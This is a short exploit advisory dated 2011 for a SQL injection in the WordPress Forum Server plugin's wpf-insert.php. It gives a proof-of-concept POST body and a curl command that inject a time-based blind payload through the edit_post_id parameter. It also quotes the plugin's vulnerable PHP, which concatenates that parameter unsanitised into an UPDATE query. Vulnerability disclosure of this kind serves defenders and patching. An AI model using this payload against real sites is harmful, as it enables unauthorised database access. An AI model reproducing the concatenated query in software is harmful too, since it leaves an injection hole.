# Date: 2011-09-07
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.7 (tested)
 
---------------
PoC (POST data)
---------------
http://www.site.com/wp-content/plugins/forum-server/wpf-insert.php
 edit_post_submit=1&edit_post_id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&edit_post_subject=test&message=dummy&thread_id=1
 
e.g.
curl --data "edit_post_submit=1&edit_post_id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&edit_post_subject=test&message=dummy&thread_id=1" http://www.site.com/wp-content/plugins/forum-server/wpf-insert.php
 
---------------
Vulnerable code
---------------
if(isset($_POST[&#039;edit_post_submit&#039;])){
    $subject = $vasthtml->input_filter($_POST[&#039;edit_post_subject&#039;]);
    $content = $vasthtml->input_filter($_POST[&#039;message&#039;]);
    $thread = $vasthtml->check_parms($_POST[&#039;thread_id&#039;]);
    $edit_post_id = $_POST[&#039;edit_post_id&#039;];
    ...   
    $sql = ("UPDATE $vasthtml->t_posts SET text = &#039;".stripslashes($content)."&#039;, subject = &#039;".stripslashes($subject)."&#039; WHERE id = $edit_post_id");
    $wpdb->query($sql);



